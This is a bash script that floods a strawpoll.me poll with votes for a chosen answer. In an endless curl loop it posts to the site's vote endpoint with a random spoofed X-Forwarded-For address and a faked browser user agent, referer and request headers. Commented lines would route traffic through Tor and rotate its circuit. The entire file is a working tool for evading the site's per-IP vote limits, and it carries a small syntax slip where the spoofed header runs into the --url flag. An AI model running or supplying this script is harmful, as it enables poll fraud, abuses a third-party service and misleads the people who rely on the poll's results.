#!/bin/bash

if [ $# -ne 2 ]
	then
		echo "Usage: <pollID> <answer>"
		exit
fi

params="id="$1"&votes="$2
referer="http://strawpoll.me/"$1
userAgent="Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36"

ifNoneMatch="If-None-Match: 639129"
origin="Origin: http://strawpoll.me"
xRequest="X-Requested-With: XMLHttpRequest"

url="http://strawpoll.me/ajax/vote"
votes=0

#service tor start
#clear

while(true); do
	spoofIP="$((RANDOM%255+1)).$((RANDOM%255+1)).$((RANDOM%255+1)).$((RANDOM%255+1))"
	xForward="X-Forwarded-For: "$spoofIP
	curl -A "$userAgent" -d "$params" -e "$referer" -H "$origin" -H "$xRequest" -H "$ifNoneMatch" -H "$xForward"--url "$url"
	votes=$((votes + 1))
	printf "\nVoting as: $spoofIP\n"
	#pidof tor | xargs kill -HUP
done
